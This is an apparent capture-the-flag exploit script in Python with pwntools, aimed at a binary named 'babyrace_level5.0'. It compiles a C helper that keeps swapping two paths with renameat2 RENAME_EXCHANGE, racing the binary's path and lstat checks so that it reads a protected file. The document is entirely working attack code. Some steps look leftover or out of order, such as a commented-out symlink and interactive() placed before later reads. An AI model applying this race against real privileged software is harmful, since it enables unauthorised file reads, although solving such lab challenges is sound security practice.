from pwn import *
import os
import time
import subprocess

context.log_level = 'info'

# Create a file in /tmp that doesn't contain "flag"
os.system("echo 'dummy data' > /tmp/safe_file")

# Create a symlink to the flag (without "flag" in the path)
#os.system("ln -sf /flag /tmp/f")

# Compile the swap program
with open('swap.c', 'w') as f:
    f.write('''
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <fcntl.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    #include <linux/fs.h>

    int main(int argc, char *argv[]) {
      if (argc != 3) {
        printf("Usage: %s path1 path2\\n", argv[0]);
        return 1;
      }
      
      while (1) {
        syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
        usleep(500); // Small delay to avoid CPU overuse
      }
      return 0;
    }
    ''')

os.system("gcc -o renameat2_swap swap.c")

# Start the swap program to exchange the files


# Give it a moment to start swapping
time.sleep(0.1)

# Start the challenge binary
p = process(["./babyrace_level5.0", "/tmp/safe_file"])

# Wait for the first pause
p.recvuntil(b"Paused (press enter to continue)")
log.info("First pause - after checking path doesn't contain 'flag'")
p.sendline(b"")


# Wait for the second pause
p.recvuntil(b"Paused (press enter to continue)")
log.info("Second pause - after lstat check (not a symlink)")
swap_process = subprocess.Popen(["./renameat2_swap", "/tmp/safe_file", "./f"])
p.sendline(b"")

# Wait for the third pause
p.interactive()
p.recvuntil(b"Paused (press enter to continue)")
log.info("Third pause - about to read the file")
p.sendline(b"")

# Get the result
output = p.recvuntil(b"### Goodbye!", timeout=3)
p.close()

# Kill the swap process
swap_process.kill()

log.success(f"Output received: {output.decode()}")
